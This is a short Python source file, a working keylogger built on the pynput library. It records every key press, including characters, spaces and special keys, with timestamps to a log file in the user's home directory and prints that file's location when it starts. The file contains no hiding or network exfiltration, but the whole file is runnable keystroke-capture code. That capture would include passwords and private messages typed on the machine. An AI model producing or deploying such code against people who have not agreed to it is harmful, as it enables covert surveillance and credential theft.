from pynput import keyboard
import logging
import os

class Keylogger:
    def __init__(self, log_file="key_log.txt"):
        self.log_file = log_file
        logging.basicConfig(filename=self.log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
        
    def on_press(self, key):
        try:
            logging.info(str(key.char))  # Logs characters
        except AttributeError:
            if key == key.space:
                logging.info(' ')  # Spacebar logging
            else:
                logging.info(f'[{key}]')  # Special keys logging (e.g., shift, enter, etc.)

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    log_path = os.path.join(os.path.expanduser("~"), "key_log.txt")
    keylogger = Keylogger(log_file=log_path)
    print(f"Logging keystrokes to {log_path}")
    keylogger.start()
